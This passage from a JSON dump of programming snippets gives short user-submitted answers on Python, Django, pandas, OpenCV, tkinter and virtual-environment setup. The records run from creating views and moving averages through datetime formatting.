template_name = 'articles/create_article.html'      ###### urls.py  ###### from .views import ArticleUpdateView urlpatterns =[    path('articles/<int:pk>/update/', ArticleUpdateView.as_view()),] # pk is default value (for primary key of id of an instance of object\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 700,
    "keyword": null,
    "link": null,
    "title": " creating a 50 day and 100 day moving average python",
    "description": "#We use the closing price for Apple to create a MA using rolling windows AAPL['Moving Average 200'] = AAPL['Close'].rolling(200).mean() AAPL['Moving Average 50'] = AAPL['Close'].rolling(50).mean()\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 701,
    "keyword": null,
    "link": null,
    "title": " creating a new enviroment in conda",
    "description": "conda create -n myenv python=3.6 \n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 702,
    "keyword": null,
    "link": null,
    "title": " creating an interface tkinter",
    "description": "import tkinter as tk #tkinter is the library that we will use  class main:   def __init__(self,master):     master.title('Simple Interface') #This is the title     master.geometry('500x500') #Our window will be a square     master.configure(background='white') #Color of background     master.resizable(False, False) #Resizable Off  if __name__ == '__main__':   master = tk.Tk() #master is the name of our window   main = main(master) #main is a class   master.mainloop() #this is the loop\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 703,
    "keyword": null,
    "link": null,
    "title": " creating dynamic variable in python",
    "description": "for i in range(0, 9):     globals()[f\"my_variable{i}\"] = f\"Hello from variable number {i}!\"   print(my_variable3) # Hello from variable number 3!\nfor i in range(0, 9):\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 704,
    "keyword": null,
    "link": null,
    "title": " creating environment variable in python",
    "description": "$ pip install python-decouple\nALLOWED_HOSTS=.localhost, .herokuapp.com\nSECRET_KEY=3izb^ryglj(bvrjb2_y1fZvcnbky#358_l6-nn#i8fkug4mmz! DEBUG=True DB_NAME=HELLO_DJANGO DB_USER=U_HELLO DB_PASSWORD=hA8(scA@!fg3*sc&xaGh&6%-l<._&xCf DB_HOST=127.0.0.1\nDEBUG = config('DEBUG', cast=bool) EMAIL_PORT = config('EMAIL_PORT', cast=int)\nDEBUG = config('DEBUG', default=True, cast=bool)\nfrom decouple import config, Csv  ALLOWED_HOSTS = config('ALLOWED_HOSTS', cast=Csv())\nfrom decouple import config\nDEBUG=False python manage.py\nimport os from decouple import config  BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) SECRET_KEY = config('SECRET_KEY') DEBUG = config('DEBUG', cast=bool) DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql_psycopg2',         'NAME': config('DB_NAME'),         'USER': config('DB_USER'),         'PASSWORD': config('DB_PASSWORD'),         'HOST': config('DB_HOST'),         'PORT': '',     } }\nALLOWED_HOSTS = config('ALLOWED_HOSTS', cast=lambda v: [s.strip() for s in v.split(',')])\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 705,
    "keyword": null,
    "link": null,
    "title": " creating list of numbers in python",
    "description": "# Python3 Program to Create list  # with integers within given range     def createList(r1, r2):     return list(range(r1, r2+1))        # Driver Code r1, r2 = -1, 1 print(createList(r1, r2)) \nverts = [None]*1000 or with numbers verts = [0]*1000\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 706,
    "keyword": null,
    "link": null,
    "title": " creating venv python3",
    "description": "# CREATE FOLDER FOR A PROJECT mkdir project_folder cd project_folder  # CREATE VIRTUAL ENVIRONMENT python3.7 -m venv myvenv  # or alternativelly virtualenv myvenv --python=python3.7  # ACTIVATE VIRTUAL ENVIRONMENT source myvenv/bin/activate\n# Create the virtual environment. python -m venv venv  # Activate the env. venv\\Scripts\\activate.bat\npython3 -m venv env \n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 707,
    "keyword": null,
    "link": null,
    "title": " creating virtual environment python",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# Create the virtual environment. python -m venv venv  # Activate the env. venv\\Scripts\\activate.bat\n# for windows 10  py -m venv myvirtualenv myvirtualenv\\Scripts\\activate #!!!! use \"\\\" not \"/\" !!!!!\npython3 -m venv tutorial-env\npython3 -m venv tutorial-env #name : tutorial-env tutorial-env\\Scripts\\activate \t#activate env deactivate #deactivate env\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 708,
    "keyword": null,
    "link": null,
    "title": " crispy forms",
    "description": "pip install django-crispy-forms \n# In Settings INSTALLED_APPS = [ \t'crispy_forms', ]  # Very Bottom of Settings CRISPY_TEMPLATE_PACK = 'bootstrap4'  # Top of HTML page {% load crispy_forms_tags %}  # Apply styling to form {{ form | crispy }}\nInstall latest stable version into your python environment using pip: pip install django-crispy-forms  Once installed add crispy_forms to your INSTALLED_APPS in settings.py: INSTALLED_APPS = (     ...     'crispy_forms', )\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 709,
    "keyword": null,
    "link": null,
    "title": " csrf token exempt django",
    "description": "from django.views.decorators.csrf import csrf_exempt  @csrf_exempt def xyx(request):   #your code    #this makes the function accept post request without csrf token #use it just for quick check or for operations where csrftoken authentication #isn't required\nCross Site Request Forgery protection&para; The CSRF middleware and template tag provides easy-to-use protection against Cross Site Request Forgeries. This type of attack occurs when a malicious website contains a link, a form button or some JavaScript that is intended  to perform some action on your website, using the credentials of a logged-in  user who visits the malicious site in their browser. A related type of attack, &lsquo;login CSRF&rsquo;, where an attacking site tricks a user&rsquo;s browser into logging into a site with someone else&rsquo;s credentials, is also covered.  The first defense against CSRF attacks is to ensure that GET requests (and other &lsquo;safe&rsquo; methods, as defined by RFC 7231#section-4.2.1) are  side effect free. Requests via &lsquo;unsafe&rsquo; methods, such as POST, PUT,  and DELETE, can then be protected by following the steps below.\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 710,
    "keyword": null,
    "link": null,
    "title": " csv python write",
    "description": "# This action requires the 'csv' module import csv  # The basic usage is to first define the rows of the csv file: row_list = [[\"SN\", \"Name\", \"Contribution\"],              [1, \"Linus Torvalds\", \"Linux Kernel\"],              [2, \"Tim Berners-Lee\", \"World Wide Web\"],              [3, \"Guido van Rossum\", \"Python Programming\"]]  # And then use the following to create the csv file: with open('protagonist.csv', 'w', newline='') as file:     writer = csv.writer(file)     writer.writerows(row_list) # This will create a csv file in the current directory\nimport csv  with open('names.csv', 'w') as csvfile:     fieldnames = ['first_name', 'last_name']     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)      writer.writeheader()     writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})     writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})     writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'}) \nwith open(r'c:\\dl\\FrameRecentSessions.csv') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.')\nimport numpy as np np.savetxt('data.csv', (col1_array, col2_array, col3_array), delimiter=',')\n>>> import csv >>> with open('eggs.csv', newline='') as csvfile: ...     spamreader = csv.reader(csvfile, delimiter=' ', quotechar='|') ...     for row in spamreader: ...         print(', '.join(row)) Spam, Spam, Spam, Spam, Spam, Baked Beans Spam, Lovely Spam, Wonderful Spam \n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 711,
    "keyword": null,
    "link": null,
    "title": " csv to numpy array",
    "description": "from numpy import genfromtxt my_data = genfromtxt('my_file.csv', delimiter=',') \nimport pandas as pd  pd.DataFrame(np_array).to_csv(\"path/to/file.csv\")\nimport numpy as np x = np.arange(0.0,5.0,1.0) np.savetxt('test.csv', x, delimiter=',') \n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 712,
    "keyword": null,
    "link": null,
    "title": " ctx.save for backward",
    "description": "\"ctx\" is a context object that can be used to stash information  for backward computation. You can cache arbitrary objects for  use in the backward pass using the \"ctx.save_for_backward\" method\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 713,
    "keyword": null,
    "link": null,
    "title": " cumulative sum in python",
    "description": "import pandas as pd import numpy as np    # Create a dataframe df1 = pd.DataFrame({\"A\":[None, 3, 8, 14],                     \"B\":[1, None, 4, 3],                     \"C\":[5, 3, 9,None]})     # Computing sum over Index axis print(df1.cumsum(axis = 0, skipna = True)) #skipna exclude null values\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 714,
    "keyword": null,
    "link": null,
    "title": " current datetime pandas",
    "description": "today = pd.to_datetime(\"today\")\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 715,
    "keyword": null,
    "link": null,
    "title": " custom scoring function gridsearchcv",
    "description": "# create custom loss function from sklearn.metrics import make_scorer  # custom loss function def rmse_loss(y_true, y_pred):     return np.sqrt(np.mean(np.square(y_pred - y_true)))     rmse = make_scorer(rmse_loss, greater_is_better=False)  # training randomized search cv model_rndm = RandomizedSearchCV(RandomForestRegressor(),                                  param_distributions=random_grid,                                 n_iter=200, scoring=rmse, cv=3, n_jobs=-1)                                                  &uarr; #                                      our custom loss function\n",
    "reg_date": "2021-10-12T11:28:41.000Z"
  },
  {
    "id": 716,
    "keyword": null,
    "link": null,
    "title": " custom scrollbar tkinter",
    "description": "from Tkinter import *  root = Tk() scrollbar = Scrollbar(root) scrollbar.pack( side = RIGHT, fill = Y )  mylist = Listbox(root, yscrollcommand = scrollbar.set ) for line in range(100):    mylist.insert(END, \"This is line number \" + str(line))  mylist.pack( side = LEFT, fill = BOTH ) scrollbar.config( command = mylist.yview )  mainloop()\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 717,
    "keyword": null,
    "link": null,
    "title": " cut 0s on string python",
    "description": ">>> '00000010'.lstrip('0') '10'\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 718,
    "keyword": null,
    "link": null,
    "title": " cv2.cv2' has no attribute 'face lbphfacerecognizer'",
    "description": "pip install opencv-contrib-python\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 719,
    "keyword": null,
    "link": null,
    "title": " cv2.cv2 has no attribute face",
    "description": "pip install opencv-contrib-python\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 720,
    "keyword": null,
    "link": null,
    "title": " cv2.cvtcolor grayscale",
    "description": "gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) \n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 721,
    "keyword": null,
    "link": null,
    "title": " cv2.rectangle",
    "description": "import cv2  cv2.rectangle(img, (x1, y1), (x2, y2), (255,0,0), 2)   x1,y1 ------ |          | |          | |          | --------x2,y2 \nimage = cv2.imread(path)   start_point = (5, 5)  end_point = (220, 220)     # Blue color in BGR  color = (255, 0, 0)     # Line thickness of 2 px  thickness = 2    # Using cv2.rectangle() method  # Draw a rectangle with blue line borders of thickness of 2 px  image = cv2.rectangle(image, start_point, end_point, color, thickness) \n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 722,
    "keyword": null,
    "link": null,
    "title": " cv2.resize()",
    "description": "resized_image = cv2.resize(image, (100, 50)) \nimport cv2   img = cv2.imread('/home/img/python.png', cv2.IMREAD_UNCHANGED)   print('Original Dimensions : ', img.shape)   scale_percent = 60 # percent of original size width = int(img.shape[1] * scale_percent / 100) height = int(img.shape[0] * scale_percent / 100) dim = (width, height) # resize image resized = cv2.resize(img, dim, interpolation = cv2.INTER_AREA)   print('Resized Dimensions : ',resized.shape)   cv2.imshow(\"Resized image\", resized) cv2.waitKey(0) cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 723,
    "keyword": null,
    "link": null,
    "title": " cv2 add circle to image",
    "description": "cv2.circle(img,(col, row), 5, (0,255,0), -1)\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 724,
    "keyword": null,
    "link": null,
    "title": " cv2 add text",
    "description": "import cv2 im = cv2.imread(path + 'pillar.png', 1) font = cv2.FONT_HERSHEY_SIMPLEX cv2.putText(im, 'Christmas', (10,450), font, 3, (0, 255, 0), 2, cv2.LINE_AA) cv2.imwrite(path + 'pillar_text.jpg', im)\ncv2.putText (image, \"text\",coordinates)\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 725,
    "keyword": null,
    "link": null,
    "title": " cv2 crop image",
    "description": "import cv2 img = cv2.imread(\"lenna.png\") crop_img = img[y:y+h, x:x+w] cv2.imshow(\"cropped\", crop_img) cv2.waitKey(0)\t\t\nim = Image.open('0.png').convert('L') im = im.crop((1, 1, 98, 33)) im.save('_0.png')\n",
    "reg_date": "2021-10-12T11:28:42.000Z"
  },
  {
    "id": 726,
    "keyword": null,
    "link": null,
    "title": " cv2 grayscale",
    "description": "gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) \n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 727,
    "keyword": null,
    "link": null,
    "title": " cv2 not found",
    "description": "To solve this run the following # main opencv pip install opencv-python # contrib package for the extra features pip install opencv-contrib-python  The official installation instructions are on the opencv website. More info can be found here:  https://www.pyimagesearch.com/opencv-tutorials-resources-guides/\npython -m pip install opencv-python\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 728,
    "keyword": null,
    "link": null,
    "title": " cv2 resize",
    "description": "resized_image = cv2.resize(image, (100, 50)) \nimport cv2   img = cv2.imread('/home/img/python.png', cv2.IMREAD_UNCHANGED)   print('Original Dimensions : ', img.shape)   scale_percent = 60 # percent of original size width = int(img.shape[1] * scale_percent / 100) height = int(img.shape[0] * scale_percent / 100) dim = (width, height) # resize image resized = cv2.resize(img, dim, interpolation = cv2.INTER_AREA)   print('Resized Dimensions : ',resized.shape)   cv2.imshow(\"Resized image\", resized) cv2.waitKey(0) cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 729,
    "keyword": null,
    "link": null,
    "title": " cv2 reverse contrast",
    "description": "imagem = cv2.bitwise_not(imagem)\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 730,
    "keyword": null,
    "link": null,
    "title": " cv2 show image",
    "description": "import cv2 img = cv2.imread('/path_to_image/opencv-logo.png') cv2.imshow('image',img) cv2.waitKey(0) cv2.destroyAllWindows()  # to use it in a loop k = cv2.waitKey(0) if k == 27:         # wait for ESC key to exit     cv2.destroyAllWindows() elif k == ord('s'): # wait for 's' key to save and exit     cv2.imwrite('messigray.png',img)     cv2.destroyAllWindows() \ncv2.imshow('image',img) cv2.waitKey(0)\ncv2.imshow('image',img) cv2.waitKey(0) \n    import numpy as np     import cv2     import matplotlib.pyplot as plt     %matplotlib inline # if you are running this code in jupyter notebook      img = cv2.imread('/path_to_image/opencv-logo.png',0) # reads image 'opencv-logo.png' as grayscale     plt.imshow(img, cmap='gray')\n img = cv2.imread('img.jpg') \n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 731,
    "keyword": null,
    "link": null,
    "title": " cv2 transparent rectangle",
    "description": "#cv2 transparent rectnagle #answerd by LUBAN MAHFUZ import cv2  import numpy as np cap = cv2.VideoCapture(1)  while True:     success, img = cap.read() #transparent rectangle start here_____________      bbox = [300,100,200,200]     blk = np.zeros(img.shape, np.uint8)     cv2.rectangle(blk, (300,100),(500,300),(225,225,225),cv2.FILLED)     img = cv2.addWeighted(img, 1.0, blk, 0.50, 1) #transparent rectangle stop here______________     cv2.imshow(\"Image\", img)     cv2.waitKey(1)     if cv2.waitKey(100) == ord('q'):         break  cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 732,
    "keyword": null,
    "link": null,
    "title": " cv2 videocapture nth frame",
    "description": "import cv2 import numpy as np  vidcap = cv2.VideoCapture(\"fileName.mp4\") vidcap.set(1, FrameNumber) viwvidcap.read()[1].astype(np.uint8)\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 733,
    "keyword": null,
    "link": null,
    "title": " cv2 write image python",
    "description": "# Filename filename = 'savedImage.jpg'    # Using cv2.imwrite() method # Saving the image cv2.imwrite(filename, img)\n",
    "reg_date": "2021-10-12T11:28:43.000Z"
  },
  {
    "id": 734,
    "keyword": null,
    "link": null,
    "title": " cv show image python",
    "description": "import cv2 img = cv2.imread('/path_to_image/opencv-logo.png') cv2.imshow('image',img) cv2.waitKey(0) cv2.destroyAllWindows()  # to use it in a loop k = cv2.waitKey(0) if k == 27:         # wait for ESC key to exit     cv2.destroyAllWindows() elif k == ord('s'): # wait for 's' key to save and exit     cv2.imwrite('messigray.png',img)     cv2.destroyAllWindows() \ncv2.imshow('image',img) cv2.waitKey(0) \n    import numpy as np     import cv2     import matplotlib.pyplot as plt     %matplotlib inline # if you are running this code in jupyter notebook      img = cv2.imread('/path_to_image/opencv-logo.png',0) # reads image 'opencv-logo.png' as grayscale     plt.imshow(img, cmap='gray')\n img = cv2.imread('img.jpg') \n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 735,
    "keyword": null,
    "link": null,
    "title": " cyclically rotate an array by one",
    "description": "def rotate( arr, n):     a[0],a[1:]=a[-1],a[:n-1]      #Driver Code     a=[-1,2,3,7,5] rotate(a,len(a)) print(a) #Output: [5, -1, 2, 3, 7]\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 736,
    "keyword": null,
    "link": null,
    "title": " d-tale colab",
    "description": "import pandas as pd  import dtale import dtale.app as dtale_app  dtale_app.USE_COLAB = True  dtale.show(pd.DataFrame([1,2,3])) \n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 737,
    "keyword": null,
    "link": null,
    "title": " daphne heroku",
    "description": "web: daphne cfehome.asgi:application --port $PORT --bind 0.0.0.0\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 738,
    "keyword": null,
    "link": null,
    "title": " dashes seaborn",
    "description": "import seaborn as sns  # dashes off, point markers on sns.relplot(x=\"x_var\", y=\"y_var\",              data=df, kind=\"line\",              ci=None, style=\"var\",              hue=\"var\", markers=True,              dashes=False)\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 739,
    "keyword": null,
    "link": null,
    "title": " data.remove()",
    "description": "data.remove()\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 740,
    "keyword": null,
    "link": null,
    "title": " database default code in settings django",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.sqlite3',         'NAME': 'mydatabase',     } } \n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 741,
    "keyword": null,
    "link": null,
    "title": " dataframe column contains string",
    "description": "df[df['A'].str.contains(\"hello\")] \n# find rows in `df1` which contain \"foo\" followed by something df1[df1['col'].str.contains(r'foo(?!$)')]        col 1  foobar\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 742,
    "keyword": null,
    "link": null,
    "title": " dataframe copy",
    "description": "new_dataframe = dataframe.copy(deep = True)\npandas.DataFrame.copy(deep=True)\n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 743,
    "keyword": null,
    "link": null,
    "title": " dataframe create",
    "description": ">>> df2 = pd.DataFrame(np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]), ...                    columns=['a', 'b', 'c']) >>> df2    a  b  c 0  1  2  3 1  4  5  6 2  7  8  9 \nimport pandas as pd    # intialise data of lists. data = {'Name':['Tom', 'nick', 'krish', 'jack'],         'Age':[20, 21, 19, 18]}    # Create DataFrame df = pd.DataFrame(data)    # Print the output. df\nimport pandas as pd  data = {'First Column Name':  ['First value', 'Second value',...],         'Second Column Name': ['First value', 'Second value',...],          ....         }  df = pd.DataFrame (data, columns = ['First Column Name','Second Column Name',...]) print (df)\n# Import pandas library  import pandas as pd     # initialize list of lists  data = [['Group A', 85], ['Group B', 92], ['Group C', 88]]     # Create the pandas DataFrame  df = pd.DataFrame(data, columns = ['Name', 'Score'])     # print dataframe.  df \nimport numpy as np import pandas as pd vect1=np.zeros(10) vect2=np.ones(10) df=pd.DataFrame({'col1':vect1,'col2':vect2})\nimport pandas as pd data = { \t\"A\":[1,2,3],     \"B\":[4,5,6],     \"C\":[7,8,9] } index = [1,2,3,4,5,6,7,8,9]  pd.DataFrame(data=data, index=index) \n",
    "reg_date": "2021-10-12T11:28:44.000Z"
  },
  {
    "id": 744,
    "keyword": null,
    "link": null,
    "title": " dataframe deep copy",
    "description": "pandas.DataFrame.copy(deep=True)\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 745,
    "keyword": null,
    "link": null,
    "title": " dataframe describe in pandas problems",
    "description": "Dataframe.describe(include='all')\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 746,
    "keyword": null,
    "link": null,
    "title": " dataframe find nan rows",
    "description": "df[df.isnull().any(axis=1)]\ndf['your column name'].isnull().values.any() \n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 747,
    "keyword": null,
    "link": null,
    "title": " dataframe from arrays python",
    "description": "import pandas as pd df=pd.DataFrame({'col1':vect1,'col2':vect2})\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 748,
    "keyword": null,
    "link": null,
    "title": " dataframe from two series",
    "description": "In [1]: s1 = pd.Series([1, 2], index=['A', 'B'], name='s1')  In [2]: s2 = pd.Series([3, 4], index=['A', 'B'], name='s2')  In [3]: pd.concat([s1, s2], axis=1) Out[3]:    s1  s2 A   1   3 B   2   4  In [4]: pd.concat([s1, s2], axis=1).reset_index() Out[4]:   index  s1  s2 0     A   1   3 1     B   2   4\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 749,
    "keyword": null,
    "link": null,
    "title": " dataframe groupby to dictionary",
    "description": "In [81]: df.groupby('Column1')['Column3'].apply(list).to_dict() Out[81]: {0: [1], 1: [2, 3, 5], 2: [1, 2], 3: [4, 5], 4: [1], 5: [1, 2, 3]} \nres = dict(tuple(d.groupby('a')))\nIn [433]: {k: list(v) for k, v in df.groupby('Column1')['Column3']} Out[433]: {0: [1], 1: [2, 3, 5], 2: [1, 2], 3: [4, 5], 4: [1], 5: [1, 2, 3]} \n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 750,
    "keyword": null,
    "link": null,
    "title": " dataframe object to numpy array",
    "description": "import pandas as pd  #initialize a dataframe df = pd.DataFrame( \t[[21, 72, 67], \t[23, 78, 69], \t[32, 74, 56], \t[52, 54, 76]], \tcolumns=['a', 'b', 'c'])  #convert dataframe to numpy array arr = df.to_numpy()  print('\\nNumpy Array\\n----------\\n', arr)\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 751,
    "keyword": null,
    "link": null,
    "title": " dataframe slice by list of values",
    "description": "In [1]: df = pd.DataFrame({'A': [5,6,3,4], 'B': [1,2,3,5]})  In [2]: df Out[2]:    A  B 0  5  1 1  6  2 2  3  3 3  4  5  In [3]: df[df['A'].isin([3, 6])] Out[3]:    A  B 1  6  2 2  3  3\nIn [4]: df[~df['A'].isin([3, 6])] Out[4]:    A  B 0  5  1 3  4  5\n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 752,
    "keyword": null,
    "link": null,
    "title": " dataframe to csv without ids",
    "description": "df.to_csv('your.csv', index=False) \n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 753,
    "keyword": null,
    "link": null,
    "title": " dataframe to dictionary with one column as key",
    "description": "pd.Series(df.A.values,index=df.B).to_dict()\npd.Series(df.A.values,index=df.B).to_dict() \n",
    "reg_date": "2021-10-12T11:28:45.000Z"
  },
  {
    "id": 754,
    "keyword": null,
    "link": null,
    "title": " dataframe to list",
    "description": "df.values.tolist() \n# import pandas as pd  import pandas as pd     # list of strings  lst = ['Geeks', 'For', 'Geeks', 'is',               'portal', 'for', 'Geeks']     # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  df \nL = ['Thanks You', 'Its fine no problem', 'Are you sure']  #create new df  df = pd.DataFrame({'col':L}) print (df)                     col 0           Thanks You 1  Its fine no problem 2         Are you sure\n# import pandas as pd   import pandas as pd  # list of strings  lst = ['fav', 'tutor', 'coding', 'skills'] # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  print(df)  \n# import pandas as pd import pandas as pd       # List1  lst = [['tom', 25], ['krish', 30],        ['nick', 26], ['juli', 22]]      df = pd.DataFrame(lst, columns =['Name', 'Age']) df \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 755,
    "keyword": null,
    "link": null,
    "title": " datatime.strptime",
    "description": " from datetime import datetime  dt_string = \"12/11/2018 09:15:32\"  # Considering date is in dd/mm/yyyy format dt_object1 = datetime.strptime(dt_string, \"%d/%m/%Y %H:%M:%S\") print(\"dt_object1 =\", dt_object1)  # Considering date is in mm/dd/yyyy format dt_object2 = datetime.strptime(dt_string, \"%m/%d/%Y %H:%M:%S\") print(\"dt_object2 =\", dt_object2) \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 756,
    "keyword": null,
    "link": null,
    "title": " date parser python pandas",
    "description": "mydateparser = lambda x: pd.datetime.strptime(x, \"%Y %m %d %H:%M:%S\") df = pd.read_csv(\"file.csv\", sep='\\t', names=['date_column', 'other_column'], parse_dates=['date_column'], date_parser=mydateparser) \ndf['DataFrame Column'] = pd.to_datetime(df['DataFrame Column'], format=specify your format) \nformat='%d-%b-%Y' \nimport pandas as pd  values = {'dates':  ['02-Sep-2019','13-Sep-2019','21-Sep-2019'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%d-%b-%Y')  print (df) print (df.dtypes) \nimport pandas as pd  values = {'dates':  ['20190902093000','20190913093000','20190921200000'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%Y%m%d%H%M%S')  print (df) print (df.dtypes) \nimport pandas as pd  values = {'dates':  ['20190902','20190913','20190921'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%Y%m%d')  print (df) print (df.dtypes) \nformat='%d%m%Y' \nimport pandas as pd  values = {'dates':  ['02092019','13092019','21092019'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%d%m%Y')  print (df) print (df.dtypes) \nimport pandas as pd  values = {'dates':  ['02Sep2019','13Sep2019','21Sep2019'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%d%b%Y')  print (df) print (df.dtypes) \nimport pandas as pd  values = {'dates':  ['20190902','20190913','20190921'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  print (df) print (df.dtypes) \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 757,
    "keyword": null,
    "link": null,
    "title": " date time module date diference",
    "description": "from datetime import date  d0 = date(2008, 8, 18) d1 = date(2008, 9, 26) delta = d1 - d0 print(delta.days)\n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 758,
    "keyword": null,
    "link": null,
    "title": " date time strftime",
    "description": "# Example usage: import datetime date_time = datetime.datetime.now() print(date_time) --> '2020-10-03 15:29:54.822751'  # From the date_time variable, you can extract the date in various # custom formats with .strftime(), for example: date_time.strftime(\"%d/%m/%Y\") --> '03/10/2020' # dd/mm/yyyy  date_time.strftime(\"%m/%d/%y\") --> '10/03/20' # mm/dd/yy  date_time.strftime(\"%Y/%m/%d\") --> '2020/10/03'  date_time.strftime(\"%Y-%m-%d\") --> '2020-10-03'  date_time.strftime(\"%B %d, %Y\") --> 'October 03, 2020'  # Key for other custom date/time formats: Directive\tDescription\t\t\t\t\t\t\t\tExample %a\t\t\tWeekday, short version\t\t\t\t\tWed\t %A\t\t\tWeekday, full version\t\t\t\t\tWednesday\t %w\t\t\tWeekday as a number 0-6, 0 is Sunday\t3\t %d\t\t\tDay of month 01-31\t\t\t\t\t\t31\t %b\t\t\tMonth name, short version\t\t\t\tDec\t %B\t\t\tMonth name, full version\t\t\t\tDecember\t %m\t\t\tMonth as a number 01-12\t\t\t\t\t12\t %y\t\t\tYear, short version, without century\t18\t %Y\t\t\tYear, full version\t\t\t\t\t\t2018\t %H\t\t\tHour 00-23\t\t\t\t\t\t\t\t17\t %I\t\t\tHour 00-12\t\t\t\t\t\t\t\t05\t %p\t\t\tAM/PM\t\t\t\t\t\t\t\t\tPM\t %M\t\t\tMinute 00-59\t\t\t\t\t\t\t41\t %S\t\t\tSecond 00-59\t\t\t\t\t\t\t08\t %f\t\t\tMicrosecond 000000-999999\t\t\t\t548513\t 